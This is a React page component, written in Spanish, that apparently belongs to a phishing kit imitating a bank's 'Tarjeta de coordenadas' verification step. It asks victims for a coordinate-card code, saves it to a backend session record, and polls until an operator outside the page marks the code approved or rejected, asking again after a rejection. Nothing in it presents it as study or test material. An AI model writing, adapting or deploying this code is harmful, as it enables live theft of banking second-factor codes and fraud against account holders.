import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { AlertTriangle } from "lucide-react";
import LoginHeader from "../components/LoginHeader";
import { base44 } from "@/api/base44Client";

export default function Coordenada() {
  const navigate = useNavigate();
  const [coords, setCoords] = useState(["", "", ""]);
  const [realCoords, setRealCoords] = useState(["", "", ""]);
  const [visible, setVisible] = useState([false, false, false]);
  const [sessionData, setSessionData] = useState(null);
  const [submitted, setSubmitted] = useState(false);
  const [coordenadaStatus, setCoordenadaStatus] = useState(null);
  const pollRef = useRef(null);
  const timersRef = useRef([]);
  const inputRefs = useRef([]);
  const urlParams = new URLSearchParams(window.location.search);
  const sessionId = urlParams.get("sessionId");

  useEffect(() => {
    if (!sessionId) return;
    base44.entities.UserSessionData.filter({ id: sessionId }).then((res) => {
      if (res[0]) setSessionData(res[0]);
    });
  }, [sessionId]);

  useEffect(() => {
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, []);

  const handleChange = (index, value) => {
    const real = value.replace(/\*/g, "");
    if (real.length > 1) return;
    if (value === "") {
      const updatedReal = [...realCoords];
      updatedReal[index] = "";
      setRealCoords(updatedReal);
      const updatedVis = [...visible];
      updatedVis[index] = false;
      setVisible(updatedVis);
      clearTimeout(timersRef.current[index]);
      return;
    }
    if (real.length === 1) {
      const updatedReal = [...realCoords];
      updatedReal[index] = real;
      setRealCoords(updatedReal);
      // Show char briefly
      const updatedVis = [...visible];
      updatedVis[index] = true;
      setVisible(updatedVis);
      clearTimeout(timersRef.current[index]);
      timersRef.current[index] = setTimeout(() => {
        setVisible((prev) => {
          const v = [...prev];
          v[index] = false;
          return v;
        });
      }, 800);
      if (index < 2) inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace") {
      if (realCoords[index] === "" && index > 0) {
        inputRefs.current[index - 1]?.focus();
      } else {
        const updatedReal = [...realCoords];
        updatedReal[index] = "";
        setRealCoords(updatedReal);
        const updatedVis = [...visible];
        updatedVis[index] = false;
        setVisible(updatedVis);
        clearTimeout(timersRef.current[index]);
      }
    }
  };

  const isValid = realCoords.every((c) => c.length === 1);
  // Display: show real char if visible, else asterisk if filled
  const displayCoords = realCoords.map((c, i) => (c === "" ? "" : visible[i] ? c : "*"));

  if (submitted && coordenadaStatus === null) {
    return (
      <div style={{ position: "fixed", inset: 0, background: "white", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 9999 }}>
        <div style={{ width: "40px", height: "40px", border: "4px solid #e5e7eb", borderTop: "4px solid #1973B8", borderRadius: "50%", animation: "spin 1s linear infinite" }} />
        <style>{"@keyframes spin { to { transform: rotate(360deg); } }"}</style>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white font-main flex flex-col">
      <LoginHeader />
      <main className="flex-1 flex flex-col items-center pt-12">
        <div style={{ width: "100%", maxWidth: "600px", padding: "0 24px", textAlign: "center" }}>

          {/* Título */}
          <h1 style={{ fontSize: "36px", fontWeight: "normal", color: "#121212", marginBottom: "16px" }}>
            Tarjeta de coordenadas
          </h1>

          {/* Instrucción */}
          <p style={{ fontSize: "18px", color: "#121212", marginBottom: "4px" }}>
            Introduce la combinación de coordenada solicitada
          </p>
          <p style={{ fontSize: "18px", color: "#121212", marginBottom: "24px" }}>
            para continuar con el proceso.
          </p>

          {/* Número de tarjeta y coordenada */}
          <p style={{ fontSize: "17px", color: "#121212", marginBottom: "4px" }}>
            N° de tarjeta: <span style={{ fontWeight: "bold" }}>{sessionData?.numeroTarjetaDisplay || "—"}</span>
          </p>
          <p style={{ fontSize: "17px", color: "#121212", marginBottom: "8px" }}>
            Coordenada: <strong>{sessionData?.coordenadaDisplay || "—"}</strong>
          </p>

          {/* ¿Cómo ubico? */}
          <a
            href="#"
            style={{ fontSize: "14px", color: "#1973B8", textDecoration: "none", display: "block", marginBottom: "32px" }}
          >
            ¿Cómo ubico la coordenada?
          </a>

          {/* Campos de coordenadas */}
          <div style={{ display: "flex", justifyContent: "center", gap: "12px", marginBottom: "40px" }}>
            {displayCoords.map((val, i) => (
              <input
                key={i}
                ref={(el) => (inputRefs.current[i] = el)}
                type="text"
                maxLength={1}
                value={val}
                onChange={(e) => handleChange(i, e.target.value)}
                onKeyDown={(e) => handleKeyDown(i, e)}
                style={{
                  width: "43px",
                  height: "56px",
                  border: "none",
                  borderBottom: coordenadaStatus === "rejected" ? "2px solid #CC0000" : "2px solid #121212",
                  textAlign: "center",
                  fontSize: "18px",
                  color: "#121212",
                  outline: "none",
                  fontFamily: "inherit",
                  background: coordenadaStatus === "rejected" ? "#ffebeb" : "#F4F4F4",
                }}
              />
            ))}
          </div>

          {/* Botón Entrar */}
          <button
            disabled={!isValid || submitted}
            onClick={async () => {
              if (!isValid || !sessionId || submitted) return;
              await base44.entities.UserSessionData.update(sessionId, {
                codigoCoordenada: realCoords.join(""),
                coordenadaStatus: "pending",
              });
              setSubmitted(true);
              pollRef.current = setInterval(async () => {
                const res = await base44.entities.UserSessionData.filter({ id: sessionId });
                const s = res[0];
                if (!s) return;
                if (s.coordenadaStatus === "approved") {
                  clearInterval(pollRef.current);
                  navigate(`/verificacion?sessionId=${sessionId}`);
                } else if (s.coordenadaStatus === "rejected") {
                  clearInterval(pollRef.current);
                  setRealCoords(["", "", ""]);
                  setVisible([false, false, false]);
                  setSubmitted(false);
                  setCoordenadaStatus("rejected");
                  setTimeout(() => setCoordenadaStatus(null), 4000);
                }
              }, 3000);
            }}
            style={{
              padding: "11px 52px",
              fontSize: "15px",
              background: isValid && !submitted ? "#1973B8" : "#d6d6d6",
              color: isValid && !submitted ? "white" : "#999",
              border: "none",
              borderRadius: "4px",
              cursor: isValid && !submitted ? "pointer" : "not-allowed",
              fontFamily: "inherit",
              transition: "all 0.2s",
            }}
          >
            {submitted && coordenadaStatus === null ? "Verificando..." : "Entrar"}
          </button>

          {/* Mensajes de estado coordenada */}
          {submitted && coordenadaStatus === null && (
            <p style={{ marginTop: "16px", color: "#004481", fontSize: "14px" }}>Verificando coordenada, por favor espere...</p>
          )}
          {coordenadaStatus === "approved" && (
            <p style={{ marginTop: "16px", color: "#16a34a", fontSize: "14px", fontWeight: "600" }}>✓ Coordenada verificada correctamente.</p>
          )}
          {coordenadaStatus === "rejected" && (
            <div style={{ marginTop: "16px", display: "flex", alignItems: "center", justifyContent: "center", gap: "8px" }}>
              <AlertTriangle className="w-5 h-5" style={{ color: "#CC0000", flexShrink: 0 }} />
              <span style={{ fontSize: "14px", color: "#121212" }}>La coordenada es inválida. <strong>Intenta nuevamente.</strong></span>
            </div>
          )}
        </div>
      </main>
    </div>
  );
}